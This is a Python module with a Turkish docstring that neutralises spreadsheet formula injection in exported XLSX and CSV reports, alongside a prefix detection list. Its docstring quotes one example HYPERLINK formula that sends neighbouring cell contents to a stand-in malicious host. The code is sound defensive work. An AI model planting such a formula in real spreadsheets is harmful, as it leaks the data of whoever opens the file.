"""(P248 §3c) HESAP TABLOSU FORMUL ENJEKSIYONU — tek kaydetme kapisi.

===========================================================================
OLCULEN KUSUR
===========================================================================
openpyxl `=` ile baslayan bir DIZEYI hucreye yazarken onu FORMUL olarak
saklar (`<f>` dugumu). Bir sakin daire notuna, bir gorevli gorev notuna
`=HYPERLINK("http://kotu.site?"&A1;"Tikla")` yazarsa, yoneticinin indirdigi
rapor Excel'de acildiginda bu formul CALISIR: tiklanabilir baglanti,
komsu hucrelerin icerigini disari tasiyan istek (CSV/DDE ailesi —
OWASP "CSV Injection").

===========================================================================
KARAR
===========================================================================
`=`, `+`, `-`, `@`, sekme (\\t) ve satir basi (\\r) ile baslayan HER metin
hucresi:
  * veri tipi `s` (duz metin) yapilir — dosyada `<f>` degil paylasilan
    dize olarak durur; hicbir uygulama onu hesaplamaz;
  * `quotePrefix` isaretlenir — Excel'in "basinda ' var" gosterimidir:
    kullanici hucreyi duzenleyip Enter'a bastiginda da formule donmez.

OWASP "basa ' koy" der; XLSX'te bunun YAPISAL karsiligi `quotePrefix`tir.
Kesme isaretini METNE eklemek, disa aktarilan vardiya planini geri
yuklerken (`/vardiya-plani/ice-aktar`) nota fazladan `'` tasirdi — yani
disa/ice aktarim dongusunu bozardi. Metin AYNEN kalir, yalniz formul
olarak yorumlanmaz.

Sayilar (`int`/`float`, para hucreleri) dokunulmaz: `-150.25` bir SAYIDIR,
formul degildir ve toplam alinabilmelidir.

KAPI TEK: uygulamadaki her `Workbook` `guvenli_kaydet()` ile bayta doner.
Kilit `tests/test_p248_formul_enjeksiyonu.py` dogrudan `wb.save(`
cagrisini yakalar.
"""
from __future__ import annotations

import io

#: OWASP CSV Injection listesi (+ sekme/CR).
TEHLIKELI_ONEKLER = ("=", "+", "-", "@", "\t", "\r")


def tehlikeli_mi(deger: object) -> bool:
    return isinstance(deger, str) and deger.startswith(TEHLIKELI_ONEKLER)


def csv_hucresi(deger: object) -> str:
    """CSV icin: tehlikeli metnin basina `'` konur (OWASP). CSV'de tip
    bilgisi yok; kesme isareti tek yapisal olmayan savunmadir."""
    metin = "" if deger is None else str(deger)
    return "'" + metin if tehlikeli_mi(metin) else metin


def calisma_kitabini_guvenli_yap(wb) -> int:
    """Kitaptaki her sayfanin tehlikeli metin hucrelerini duz metne cevirir.
    Doner: duzeltilen hucre sayisi (test ve teshis icin)."""
    sayi = 0
    for ws in wb.worksheets:
        for satir in ws.iter_rows():
            for hucre in satir:
                if tehlikeli_mi(hucre.value):
                    hucre.data_type = "s"
                    hucre.quotePrefix = True
                    sayi += 1
    return sayi


def guvenli_kaydet(wb) -> bytes:
    """Workbook -> XLSX baytlari; ONCE formul enjeksiyonu temizlenir."""
    calisma_kitabini_guvenli_yap(wb)
    tampon = io.BytesIO()
    wb.save(tampon)
    return tampon.getvalue()
